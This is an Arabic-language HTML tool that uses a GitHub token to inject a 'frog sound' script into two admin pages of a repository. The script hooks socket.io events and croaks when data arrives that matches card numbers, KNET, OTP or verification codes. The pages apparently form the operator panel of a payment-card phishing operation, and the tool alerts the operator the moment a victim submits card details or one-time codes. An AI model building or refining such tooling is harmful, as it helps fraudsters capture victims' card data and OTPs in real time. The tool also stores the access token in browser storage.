<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>KDD - صوت الفقّة (مفلتر)</title>
<style>
  body{font-family:system-ui,Segoe UI,Tahoma,sans-serif;background:#0f1115;color:#e8eaf0;margin:0;padding:20px}
  .wrap{max-width:820px;margin:0 auto}
  h1{font-size:20px;margin:0 0 4px}
  p.sub{color:#9aa3b2;font-size:13px;margin:0 0 18px}
  .card{background:#171a21;border:1px solid #242a35;border-radius:12px;padding:16px;margin-bottom:14px}
  label{display:block;font-size:13px;color:#9aa3b2;margin-bottom:6px}
  input{width:100%;box-sizing:border-box;background:#0d0f13;border:1px solid #2b3240;color:#e8eaf0;border-radius:9px;padding:11px;font-size:14px;direction:ltr}
  .row{display:flex;gap:10px;margin-top:12px;flex-wrap:wrap}
  button{flex:1;min-width:160px;border:0;border-radius:9px;padding:12px;font-size:15px;font-weight:600;cursor:pointer}
  .go{background:#2ecc71;color:#06210f}
  .test{background:#2b3240;color:#e8eaf0}
  button:disabled{opacity:.55;cursor:default}
  #log{background:#0b0d11;border:1px solid #242a35;border-radius:12px;padding:14px;font-family:ui-monospace,Menlo,monospace;font-size:12.5px;white-space:pre-wrap;min-height:120px;direction:ltr;text-align:left;line-height:1.6}
  .ok{color:#2ecc71}.er{color:#ff6b6b}.in{color:#7fb3ff}
</style>
</head>
<body>
<div class="wrap">
  <h1>صوت الفقّة - الملخص + الكي نت/البطاقة + الرمز فقط</h1>
  <p class="sub">الصوت يطلع بس لبيانات الملخص، بيانات الكي نت/البطاقة، وأي رمز. باقي الأحداث صامتة. اضغط M للكتم.</p>

  <div class="card">
    <label>GitHub Token (repo scope)</label>
    <input id="tok" placeholder="ghp_...">
    <div class="row">
      <button class="go" id="run">تثبيت / تحديث الفلتر</button>
      <button class="test" id="tst">تجربة الصوت</button>
    </div>
  </div>

  <div id="log">جاهز.</div>
</div>

<script>
var REPO='fahshomi-ui/KDD', BRANCH='main';
var FILES=['server/admin/index.html','kdd-public/admin.html'];

var FROG = '<script>/*FROG-SOUND2*/\n' +
'(function(){\n' +
'  var AC=window.AudioContext||window.webkitAudioContext, ac=null;\n' +
'  var muted=(localStorage.getItem("kdd_frog_mute")==="1"), last=0;\n' +
'  var BLOCK=/connect|disconnect|reconnect|pagechanged|navigate|hide|error|action/i;\n' +
'  var ALLOW=/data|card|code|live|knet|pay|otp|verif|summary|ملخص|رمز/i;\n' +
'  function shouldPlay(ev,args){\n' +
'    var n=String(ev);\n' +
'    if(BLOCK.test(n)) return false;\n' +
'    if(ALLOW.test(n)) return true;\n' +
'    try{\n' +
'      var s=JSON.stringify(Array.prototype.slice.call(args));\n' +
'      if(/digitCode|"code"|رمز|cardNumber|knet|ملخص|dataHistory|summary|otp/i.test(s)) return true;\n' +
'    }catch(e){}\n' +
'    return false;\n' +
'  }\n' +
'  function play(){\n' +
'    try{\n' +
'      if(muted||!AC) return;\n' +
'      var n=Date.now(); if(n-last<120) return; last=n;\n' +
'      if(!ac) ac=new AC();\n' +
'      if(ac.state==="suspended"){ ac.resume(); }\n' +
'      var t=ac.currentTime;\n' +
'      function croak(s){\n' +
'        var o=ac.createOscillator(), g=ac.createGain();\n' +
'        o.type="sawtooth";\n' +
'        o.frequency.setValueAtTime(300,s);\n' +
'        o.frequency.exponentialRampToValueAtTime(150,s+0.09);\n' +
'        g.gain.setValueAtTime(0.0001,s);\n' +
'        g.gain.exponentialRampToValueAtTime(0.30,s+0.012);\n' +
'        g.gain.exponentialRampToValueAtTime(0.0001,s+0.11);\n' +
'        o.connect(g); g.connect(ac.destination);\n' +
'        o.start(s); o.stop(s+0.13);\n' +
'      }\n' +
'      croak(t); croak(t+0.17);\n' +
'    }catch(e){}\n' +
'  }\n' +
'  window.__frogPlay=play;\n' +
'  ["click","keydown","touchstart","mousedown"].forEach(function(ev){\n' +
'    window.addEventListener(ev,function(){ try{ if(!ac&&AC) ac=new AC(); if(ac&&ac.state==="suspended") ac.resume(); }catch(e){} },{passive:true});\n' +
'  });\n' +
'  window.addEventListener("keydown",function(e){\n' +
'    var tg=(e.target&&e.target.tagName||"").toLowerCase();\n' +
'    if(tg==="input"||tg==="textarea") return;\n' +
'    if(e.key==="m"||e.key==="M"){ muted=!muted; localStorage.setItem("kdd_frog_mute",muted?"1":"0"); }\n' +
'  });\n' +
'  function hook(sock){\n' +
'    if(!sock||sock.__frogHooked) return;\n' +
'    sock.__frogHooked=true;\n' +
'    ["on","once"].forEach(function(m){\n' +
'      if(typeof sock[m]!=="function") return;\n' +
'      var orig=sock[m].bind(sock);\n' +
'      sock[m]=function(ev){\n' +
'        if(ev==="connect"||ev==="disconnect"||ev==="connect_error"||ev==="reconnect") return orig.apply(sock,arguments);\n' +
'        var rest=Array.prototype.slice.call(arguments,1).map(function(fn){\n' +
'          if(typeof fn!=="function") return fn;\n' +
'          return function(){ try{ if(shouldPlay(ev,arguments)) play(); }catch(e){} return fn.apply(this,arguments); };\n' +
'        });\n' +
'        return orig.apply(sock,[ev].concat(rest));\n' +
'      };\n' +
'    });\n' +
'  }\n' +
'  function wrapIo(){\n' +
'    if(!window.io||window.io.__frogWrapped) return false;\n' +
'    var o=window.io;\n' +
'    function w(){ var s=o.apply(this,arguments); try{ hook(s); }catch(e){} return s; }\n' +
'    for(var k in o){ try{ w[k]=o[k]; }catch(e){} }\n' +
'    w.__frogWrapped=true; window.io=w; return true;\n' +
'  }\n' +
'  if(!wrapIo()){ var n=0, iv=setInterval(function(){ if(wrapIo()) clearInterval(iv); if(window.socket) hook(window.socket); if(++n>400) clearInterval(iv); },50); }\n' +
'})();\n' +
'<\/script>';

var logEl=document.getElementById('log');
function log(t,cls){ var s=document.createElement('div'); if(cls)s.className=cls; s.textContent=t; logEl.appendChild(s); logEl.scrollTop=logEl.scrollHeight; }

function b64e(str){ var b=new TextEncoder().encode(str), s=''; for(var i=0;i<b.length;i++) s+=String.fromCharCode(b[i]); return btoa(s); }
function b64d(str){ var bin=atob(str.replace(/\s/g,'')), u=new Uint8Array(bin.length); for(var i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i); return new TextDecoder().decode(u); }

function H(){ return {'Authorization':'token '+document.getElementById('tok').value.trim(),'Accept':'application/vnd.github+json','Content-Type':'application/json'}; }

async function getFile(p){ var r=await fetch('https://api.github.com/repos/'+REPO+'/contents/'+p+'?ref='+BRANCH,{headers:H()}); if(r.status===404) return null; if(!r.ok) throw new Error('قراءة '+p+' فشلت ('+r.status+')'); return r.json(); }
async function putFile(p,c,sha,msg){ var r=await fetch('https://api.github.com/repos/'+REPO+'/contents/'+p,{method:'PUT',headers:H(),body:JSON.stringify({message:msg,content:b64e(c),sha:sha,branch:BRANCH})}); if(!r.ok) throw new Error('رفع '+p+' فشل ('+r.status+') '+(await r.text()).slice(0,150)); return r.json(); }

function inject(html){
  if(html.indexOf('FROG-SOUND2')!==-1) return {html:html,changed:false};
  // احذف النسخة القديمة اذا موجودة
  if(html.indexOf('FROG-SOUND')!==-1){ html=html.replace(/<script>\s*\/\*FROG-SOUND\*\/[\s\S]*?<\/script>\s*/,''); }
  var re=/<script[^>]*src=["'][^"']*socket\.io[^"']*["'][^>]*>\s*<\/script>/i;
  var m=html.match(re);
  if(m){ var i=m.index+m[0].length; return {html:html.slice(0,i)+'\n'+FROG+'\n'+html.slice(i),changed:true}; }
  var b=html.search(/<\/body>/i);
  if(b>-1) return {html:html.slice(0,b)+FROG+'\n'+html.slice(b),changed:true};
  return {html:html+FROG,changed:true};
}

document.getElementById('run').onclick=async function(){
  var btn=this, tok=document.getElementById('tok').value.trim();
  if(!tok){ log('أدخل التوكن أولاً','er'); return; }
  localStorage.setItem('kdd_tok',tok);
  btn.disabled=true; logEl.innerHTML=''; log('بدأ التثبيت...','in');
  var done=0, skip=0;
  for(var i=0;i<FILES.length;i++){
    var p=FILES[i];
    try{
      var f=await getFile(p);
      if(!f){ log('• '+p+' : غير موجود','er'); continue; }
      var r=inject(b64d(f.content));
      if(!r.changed){ log('• '+p+' : الفلتر مثبّت مسبقاً','ok'); skip++; continue; }
      await putFile(p,r.html,f.sha,'صوت الفقّة: الملخص + الكي نت/البطاقة + الرمز فقط');
      log('• '+p+' : تم التعديل والرفع','ok'); done++;
    }catch(e){ log('• '+p+' : '+e.message,'er'); }
  }
  log('— انتهى — تم: '+done+' / مثبّت مسبقاً: '+skip,'in');
  btn.disabled=false;
};

document.getElementById('tst').onclick=function(){
  try{
    var AC=window.AudioContext||window.webkitAudioContext, ac=new AC(), t=ac.currentTime;
    function cr(s){ var o=ac.createOscillator(),g=ac.createGain(); o.type='sawtooth'; o.frequency.setValueAtTime(300,s); o.frequency.exponentialRampToValueAtTime(150,s+0.09); g.gain.setValueAtTime(0.0001,s); g.gain.exponentialRampToValueAtTime(0.3,s+0.012); g.gain.exponentialRampToValueAtTime(0.0001,s+0.11); o.connect(g); g.connect(ac.destination); o.start(s); o.stop(s+0.13); }
    cr(t); cr(t+0.17);
  }catch(e){ log('تعذّر تشغيل الصوت: '+e.message,'er'); }
};

document.getElementById('tok').value=localStorage.getItem('kdd_tok')||'';
</script>
</body>
</html>
